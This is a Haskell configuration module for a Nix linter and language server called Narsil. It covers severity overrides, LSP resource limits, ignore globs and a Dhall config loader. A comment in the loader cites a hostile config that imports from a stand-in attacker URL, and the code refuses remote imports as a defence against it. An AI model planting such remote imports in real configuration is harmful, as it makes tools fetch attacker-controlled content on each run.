{-# LANGUAGE DeriveGeneric #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE OverloadedStrings #-}

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--                                                                       // nix // compile // config
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--
--   "Credit me with a certain talent for obtaining desired results."
--
--                                                                                      — Count Zero
--
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--                                                                                // config // dhall
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

module Narsil.Core.Config (
  Severity (..),
  RuleOverride (..),
  LspConfig (..),
  defaultLspConfig,
  Config (..),
  loadConfig,
  defaultConfig,
  getLspRuntime,
  setLspRuntime,
  getLspProjectConfig,
  setLspProjectConfig,
  effectiveSeverity,
  effectiveLayout,
  configIgnores,
  isIgnored,
  isSuppressed,
  matchGlob,
  bashRuleId,
  nixRuleId,
  derivRuleId,
  packageRuleId,
  patternRuleId,
  typeCheckRuleId,
)
where

import Control.Exception (SomeException, try)
import Data.Foldable (toList)
import Data.IORef (IORef, newIORef, readIORef, writeIORef)
import Data.Maybe (listToMaybe)
import Data.Text (Text)
import Data.Text qualified as T
import Data.Text.IO qualified as TIO
import Dhall (FromDhall, InterpretOptions (..), defaultInterpretOptions, genericAutoWith)
import Dhall qualified
import Dhall.Core qualified as DhallCore
import Dhall.Parser qualified as DhallParser
import GHC.Generics (Generic)
import Numeric.Natural (Natural)
import System.FilePath qualified as FP
import System.IO.Unsafe (unsafePerformIO)

import Narsil.Layout.Convention (Convention, layoutFromName)
import Narsil.Lint.Derivation qualified as Deriv
import Narsil.Lint.Forbidden qualified as Bash
import Narsil.Lint.Nix qualified as NixLint
import Narsil.Lint.Packages qualified as LintPackages
import Narsil.Lint.Patterns qualified as LintPatterns

-- ─────────────────────────────────────────────────────────────────────────────────────────────────
-- Types
-- ─────────────────────────────────────────────────────────────────────────────────────────────────

-- | a rule's effective severity, from suppressed ('SevOff') up to 'SevError'.
data Severity
  = SevOff
  | SevInfo
  | SevWarning
  | SevError
  deriving stock (Eq, Ord, Show, Generic)

instance FromDhall Severity where
  autoWith _norm =
    genericAutoWith
      (defaultInterpretOptions{constructorModifier = T.drop 3})

-- | a user override of one rule's severity, with an optional justification.
data RuleOverride = RuleOverride
  { overrideId :: !Text
  , overrideSeverity :: !Severity
  , overrideReason :: !(Maybe Text)
  }
  deriving stock (Eq, Show, Generic)

instance FromDhall RuleOverride where
  autoWith _norm =
    genericAutoWith (defaultInterpretOptions{fieldModifier = renameField})
   where
    renameField "overrideId" = "id"
    renameField "overrideSeverity" = "severity"
    renameField "overrideReason" = "reason"
    renameField n = n

{- | the LSP runtime knobs: the warm-eval-pool concurrency and the eval cache's
memory / disk quotas. Sized in whole units (threads, MiB) so the config reads
naturally; the cache converts MiB to bytes. See "Narsil.Nixpkgs.Cache".
-}
data LspConfig = LspConfig
  { lspMaxThreads :: !Natural
  , lspMaxMemoryMB :: !Natural
  , lspMaxDiskMB :: !Natural
  }
  deriving stock (Eq, Show, Generic)

instance FromDhall LspConfig where
  autoWith _norm =
    genericAutoWith (defaultInterpretOptions{fieldModifier = renameField})
   where
    renameField "lspMaxThreads" = "max-threads"
    renameField "lspMaxMemoryMB" = "max-memory-mb"
    renameField "lspMaxDiskMB" = "max-disk-mb"
    renameField n = n

-- | the built-in LSP knobs: 4 eval workers, 256 MiB resident, 512 MiB on disk.
defaultLspConfig :: LspConfig
defaultLspConfig = LspConfig{lspMaxThreads = 4, lspMaxMemoryMB = 256, lspMaxDiskMB = 512}

-- | the resolved tool configuration: profile, layout convention, ignores, and rule overrides.
data Config = Config
  { configProfile :: !Text
  , configLayout :: !Text
  , configExtraIgnores :: ![Text]
  , configOverrides :: ![RuleOverride]
  , configLsp :: !LspConfig
  }
  deriving stock (Eq, Show, Generic)

instance FromDhall Config where
  autoWith _norm =
    genericAutoWith (defaultInterpretOptions{fieldModifier = renameField})
   where
    renameField "configProfile" = "profile"
    renameField "configLayout" = "layout"
    renameField "configExtraIgnores" = "extra-ignores"
    renameField "configOverrides" = "overrides"
    renameField "configLsp" = "lsp"
    renameField n = n

-- ─────────────────────────────────────────────────────────────────────────────────────────────────
-- Defaults
-- ─────────────────────────────────────────────────────────────────────────────────────────────────

-- | the built-in config used when no @.nix-compile.dhall@ is present.
defaultConfig :: Config
defaultConfig =
  Config
    { configProfile = "standard"
    , configLayout = "straylight"
    , configExtraIgnores = []
    , configOverrides = []
    , configLsp = defaultLspConfig
    }

-- ─────────────────────────────────────────────────────────────────────────────────────────────────
-- LSP runtime knobs
-- ─────────────────────────────────────────────────────────────────────────────────────────────────

{-# NOINLINE lspRuntimeRef #-}

{- | The process-wide LSP knobs, installed once at server startup from the project
config (see the @initialized@ handler) and read when the eval cache and warm pool
first spin up. A CAF, like the server's other process-global state.
-}
lspRuntimeRef :: IORef LspConfig
lspRuntimeRef = unsafePerformIO (newIORef defaultLspConfig)

-- | Install the LSP knobs (called once, before the cache / pool are forced).
setLspRuntime :: LspConfig -> IO ()
setLspRuntime = writeIORef lspRuntimeRef

-- | Read the installed LSP knobs (defaults until 'setLspRuntime' runs).
getLspRuntime :: IO LspConfig
getLspRuntime = readIORef lspRuntimeRef

{-# NOINLINE lspProjectConfigRef #-}

{- | The WHOLE project config for the LSP process (not just the @lsp@ knobs) —
diagnostics filtering needs the profile + overrides. Installed once at server
startup alongside 'setLspRuntime'; 'defaultConfig' until then.
-}
lspProjectConfigRef :: IORef Config
lspProjectConfigRef = unsafePerformIO (newIORef defaultConfig)

-- | Install the project config (called once, at server initialization).
setLspProjectConfig :: Config -> IO ()
setLspProjectConfig = writeIORef lspProjectConfigRef

-- | Read the installed project config (defaults until 'setLspProjectConfig' runs).
getLspProjectConfig :: IO Config
getLspProjectConfig = readIORef lspProjectConfigRef

-- ─────────────────────────────────────────────────────────────────────────────────────────────────
-- Queries
-- ─────────────────────────────────────────────────────────────────────────────────────────────────

-- | the layout 'Convention' named by the config's @layout@ field.
effectiveLayout :: Config -> Convention
effectiveLayout = layoutFromName . configLayout

-- ─────────────────────────────────────────────────────────────────────────────────────────────────
-- Loading
-- ─────────────────────────────────────────────────────────────────────────────────────────────────

{- | Load a Dhall config file with remote imports forbidden.
n.b. fixes C6 from review-2: a hostile `.nix-compile.dhall` containing
`https://attacker.example/x.dhall` would otherwise perform outbound HTTPS
requests on every `narsil check` invocation. We pre-parse the source,
walk the AST for any 'DhallImport.Remote' imports, and refuse the file if
any are present.
-}
loadConfig :: FilePath -> IO (Either Text Config)
loadConfig path = do
  srcResult <- try (TIO.readFile path)
  either showError fromSrc srcResult
 where
  showError (e :: SomeException) = pure (Left (T.pack (show e)))
  fromSrc src = either onParseError fromParsed (DhallParser.exprFromText path src)
  onParseError e = pure (Left ("dhall parse error: " <> T.pack (show e)))
  fromParsed parsed = maybe loadInput refuse (findRemoteImport parsed)
  refuse url =
    pure $
      Left $
        "refusing to load "
          <> T.pack path
          <> ": remote dhall import disabled (saw "
          <> url
          <> "). narsil config must be self-contained."
  loadInput = do
    -- The pre-parse check guarantees no Remote imports survive to Dhall.inputFile.
    -- We still wrap in try so any unexpected exception (eval errors, etc.) is structured.
    result <- try (Dhall.inputFile Dhall.auto path)
    either showError (pure . Right) result

-- | Walk a parsed Dhall expression and return the first remote URL we encounter, if any.
findRemoteImport :: DhallCore.Expr DhallParser.Src DhallCore.Import -> Maybe Text
findRemoteImport expr = maybe (scanEmbed expr) Just (foldr step Nothing (toList expr))
 where
  step ::
    DhallCore.Import ->
    Maybe Text ->
    Maybe Text
  step _ acc@(Just _) = acc
  step imp Nothing = remoteUrl (DhallCore.importType (DhallCore.importHashed imp))

  scanEmbed (DhallCore.Embed imp) = remoteUrl (DhallCore.importType (DhallCore.importHashed imp))
  scanEmbed _ = Nothing

  remoteUrl (DhallCore.Remote url) = Just (T.pack (show url))
  remoteUrl _ = Nothing

-- ─────────────────────────────────────────────────────────────────────────────────────────────────
-- Queries
-- ─────────────────────────────────────────────────────────────────────────────────────────────────

{- | the overridden severity for a rule id from the EXPLICIT overrides list, or
'Nothing' if the config leaves it alone. n.b. this consults only the user's
`overrides` — the PROFILE-aware query (explicit overrides, then the resolved
profile chain) is 'Narsil.Core.Profiles.effectiveSeverity', which is what
the CLI consumes.
-}
effectiveSeverity :: Config -> Text -> Maybe Severity
effectiveSeverity config ruleId =
  overrideSeverity <$> listToMaybe (filter ((== ruleId) . overrideId) (configOverrides config))

-- | the configured extra ignore globs.
configIgnores :: Config -> [Text]
configIgnores = configExtraIgnores

-- | does any configured ignore glob match this (normalised) path?
isIgnored :: Config -> FilePath -> Bool
isIgnored config filePath = any (`matchGlob` normalisedPath) (configExtraIgnores config)
 where
  normalisedPath = FP.normalise filePath

-- | is this rule id overridden to 'SevOff' (fully suppressed)?
isSuppressed :: Config -> Text -> Bool
isSuppressed config ruleId = effectiveSeverity config ruleId == Just SevOff

-- | the stable rule id for a bash-lint violation (the key configs override on).
bashRuleId :: Bash.ViolationType -> Text
bashRuleId Bash.VHeredoc = "no-heredoc-in-inline-bash"
bashRuleId Bash.VHereString = "no-heredoc-in-inline-bash"
bashRuleId Bash.VEval = "no-eval"
bashRuleId Bash.VBacktick = "no-backtick"

-- | the stable rule id for a nix-lint violation.
nixRuleId :: NixLint.ViolationType -> Text
nixRuleId NixLint.VWith = "with-lib"
nixRuleId NixLint.VRec = "rec-anywhere"
nixRuleId NixLint.VSubstituteAll = "no-substitute-all"
nixRuleId NixLint.VRawMkDerivation = "no-raw-mkderivation"
nixRuleId NixLint.VRawRunCommand = "no-raw-runcommand"
nixRuleId NixLint.VRawWriteShellApplication = "no-raw-writeshellapplication"
nixRuleId NixLint.VWriteShellScript = "prefer-write-shell-application"
nixRuleId (NixLint.VLongInlineString _) = "long-inline-string"
nixRuleId (NixLint.VNonLispCase _) = "non-lisp-case"

-- | the stable rule id for a derivation-lint violation.
derivRuleId :: Deriv.DerivViolationType -> Text
derivRuleId = Deriv.derivRuleId

-- | the stable rule id for a package-layout violation.
packageRuleId :: LintPackages.PackageViolationCode -> Text
packageRuleId LintPackages.P001 = "default-nix-in-packages"

-- | the stable rule id for a prelude-pattern violation.
patternRuleId :: LintPatterns.PatternViolationType -> Text
patternRuleId LintPatterns.VOrNullFallback = "or-null-fallback"
patternRuleId LintPatterns.VAttrTranslation = "no-translate-attrs-outside-prelude"

-- | the rule id carried by type-check failures.
typeCheckRuleId :: Text
typeCheckRuleId = "type-check-failure"

-- ─────────────────────────────────────────────────────────────────────────────────────────────────
-- Internal: glob matching
-- ─────────────────────────────────────────────────────────────────────────────────────────────────

data Token
  = GlobStar
  | Star
  | Lit !String
  deriving (Show)

tokenise :: String -> [Token]
tokenise = go
 where
  go [] = []
  go ('*' : '*' : rest) = GlobStar : go rest
  go ('*' : rest) = Star : go rest
  go ('/' : rest) = go rest
  go chars =
    let (literal, rest') = break (`elem` ("*/" :: String)) chars
     in if null literal
          then go rest'
          else Lit literal : go rest'

charMatch :: String -> String -> Bool
charMatch [] [] = True
charMatch ('*' : pat) [] = charMatch pat []
charMatch ('*' : pat) string@(_ : rest) = charMatch pat string || charMatch ('*' : pat) rest
charMatch (char : pat) (otherChar : rest) = char == otherChar && charMatch pat rest
charMatch _ _ = False

tokensToPattern :: [Token] -> String
tokensToPattern [] = []
tokensToPattern (GlobStar : rest) = '*' : '*' : tokensToPattern rest
tokensToPattern (Star : rest) = '*' : tokensToPattern rest
tokensToPattern (Lit literal : rest) = literal <> tokensToPattern rest

splitComponents :: String -> [[Token]]
splitComponents = map tokenise . splitOn '/'

splitOn :: Char -> String -> [String]
splitOn _ [] = [""]
splitOn delimiter string =
  let (before, after) = break (== delimiter) string
   in before : continuation after
 where
  continuation "" = []
  continuation (_ : rest) = splitOn delimiter rest

matchComponents :: [[Token]] -> [String] -> Bool
matchComponents [] [] = True
matchComponents [] _ = False
matchComponents (component : remainingComponents) segments
  | null component = matchComponents remainingComponents segments
  | [GlobStar] <- component = matchGlobStar remainingComponents segments
  | segment : remainingSegments <- segments =
      charMatch (tokensToPattern component) segment
        && matchComponents remainingComponents remainingSegments
  | otherwise = False
 where
  matchGlobStar remainingComponentPatterns [] =
    matchComponents remainingComponentPatterns []
  matchGlobStar remainingComponentPatterns globSegments@(_ : _) =
    matchComponents remainingComponentPatterns globSegments
      || matchComponents (component : remainingComponentPatterns) (drop 1 globSegments)

matchGlob :: Text -> FilePath -> Bool
matchGlob patternText filePath
  | '/' `elem` globPattern = matchComponents (splitComponents globPattern) segments
  | otherwise = any (charMatch globPattern) segments
 where
  globPattern = T.unpack patternText
  segments = FP.splitDirectories filePath
